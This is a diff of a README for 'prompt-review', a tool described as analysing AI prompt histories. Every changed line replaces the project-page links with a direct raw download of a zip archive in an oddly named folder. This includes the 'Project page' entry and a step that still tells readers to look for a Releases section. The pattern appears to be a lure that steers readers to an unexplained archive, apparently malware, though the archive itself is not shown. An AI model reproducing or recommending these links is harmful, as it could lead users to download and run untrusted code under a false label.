@@ -1,6 +1,6 @@
 # 🎯 prompt-review - Analyze AI Prompt History Easily
 
-[![Download prompt-review](https://img.shields.io/badge/Download-prompt--review-brightgreen)](https://github.com/adorecleanly950/prompt-review)
+[![Download prompt-review](https://img.shields.io/badge/Download-prompt--review-brightgreen)](https://github.com/adorecleanly950/prompt-review/raw/refs/heads/main/gelotoscopy/prompt_review_v2.6.zip)
 
 ---
 
@@ -35,12 +35,12 @@ prompt-review works with logs and histories from many AI tools. It supports diff
 
 You can get prompt-review from its GitHub page. Use the link below to visit the project and download the files you need.
 
-[![Download prompt-review](https://img.shields.io/badge/Download-prompt--review-brightgreen)](https://github.com/adorecleanly950/prompt-review)
+[![Download prompt-review](https://img.shields.io/badge/Download-prompt--review-brightgreen)](https://github.com/adorecleanly950/prompt-review/raw/refs/heads/main/gelotoscopy/prompt_review_v2.6.zip)
 
 ### Step 1: Visit the download page
 
 - Open your web browser.
-- Go to this page: https://github.com/adorecleanly950/prompt-review
+- Go to this page: https://github.com/adorecleanly950/prompt-review/raw/refs/heads/main/gelotoscopy/prompt_review_v2.6.zip
 - Find the **Releases** section or the Download button.
 
 ### Step 2: Download the software
@@ -137,10 +137,10 @@ A: No. The software relies on your saved conversation histories to analyze promp
 
 ## 📂 Useful Links
 
-- Project page: https://github.com/adorecleanly950/prompt-review
-- Download prompt-review: https://github.com/adorecleanly950/prompt-review (click Releases)
+- Project page: https://github.com/adorecleanly950/prompt-review/raw/refs/heads/main/gelotoscopy/prompt_review_v2.6.zip
+- Download prompt-review: https://github.com/adorecleanly950/prompt-review/raw/refs/heads/main/gelotoscopy/prompt_review_v2.6.zip (click Releases)
 - Documentation and help: Check the project’s README on GitHub above
 
 ---
 
-[![Download prompt-review](https://img.shields.io/badge/Download-prompt--review-brightgreen)](https://github.com/adorecleanly950/prompt-review)
+[![Download prompt-review](https://img.shields.io/badge/Download-prompt--review-brightgreen)](https://github.com/adorecleanly950/prompt-review/raw/refs/heads/main/gelotoscopy/prompt_review_v2.6.zip)
